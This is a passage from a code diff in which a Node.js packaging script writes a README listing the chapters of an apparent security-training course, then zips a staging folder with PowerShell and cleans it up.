+- **Chapter 2: The Trading Post (Web Security)**: 10 rooms covering Recon, DevTools, Cookies & Session trust, Client-side validation bypasses, IDOR, SQL Injection, Reflected XSS, Security Headers, Stored XSS, and Multi-stage vulnerability chains.
+- **Chapter 3: The Forge (Secure Coding)**: 8 rooms covering Parameterized queries, Contextual output encoding, Server-side authorization gates, Strict client boundaries, Defensive headers, Token-bucket rate limiting, Environment secret hygiene, and Holistic defensive audits.
+`
+fs.writeFileSync(path.join(stagingDir, 'README.md'), readmeContent, 'utf8')
+
+try {
+  execSync(`powershell -Command "Compress-Archive -Path '${stagingDir}\\*' -DestinationPath '${zipPath}' -Force"`)
+  fs.rmSync(stagingDir, { recursive: true, force: true })
+  console.log('SUCCESS! Updated ZIP archive created at:', zipPath)
+} catch (err) {
+  console.error('Error compressing ZIP archive:', err)
 }
